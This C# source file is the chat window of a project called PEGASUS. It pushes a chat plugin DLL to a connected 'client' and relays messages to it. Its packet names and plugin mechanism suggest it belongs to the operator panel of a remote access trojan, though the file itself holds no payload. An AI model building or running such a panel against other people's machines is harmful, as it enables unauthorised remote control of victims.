using PEGASUS.Cryptografhsh;
using PEGASUS.Diadyktio;
using PEGASUS.Metafora_Dedomenon;
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace PEGASUS.Design
{
    public partial class FormChat : Form
    {
        private string Nickname = "Admin";

        public FormChat()
        {
            InitializeComponent();
        }

        public PEGALISIUS F { get; set; }
        internal Clients ParentClient { get; set; }
        internal Clients Client { get; set; }

        private void FormChat_Load(object sender, EventArgs e)
        {
            var nick = InputDialog.Show("TYPE YOUR NICKNAME");
            if (string.IsNullOrEmpty(nick))
            {
                Close();
            }
            else
            {
                Nickname = nick;
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\CT.dll");
                ThreadPool.QueueUserWorkItem(ParentClient.Send, msgpack.Encode2Bytes());
            }
        }

        private void FormChat_FormClosed(object sender, FormClosedEventArgs e)
        {
            if (Client != null)
                try
                {
                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "chatExit";
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                }
                catch
                {
                }
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected) Close();
            }
            catch
            {
            }
        }



        private void guna2PictureBox1_Click(object sender, EventArgs e)
        {
            Close();
        }

        [DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
        private static extern void ReleaseCapture();

        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
        private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

        private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, 0x112, 0xf012, 0);
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            if (textBox1.Enabled && !string.IsNullOrWhiteSpace(textBox1.Text))
            {
                richTextBox1.SelectionColor = Color.Green;
                richTextBox1.AppendText("ME: \n");
                richTextBox1.SelectionColor = Color.Black;
                richTextBox1.AppendText(textBox1.Text + Environment.NewLine);
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "chatWriteInput";
                msgpack.ForcePathObject("Input").AsString = Nickname + ": \n";
                msgpack.ForcePathObject("Input2").AsString = textBox1.Text;
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                textBox1.Clear();
            }
        }
    }
}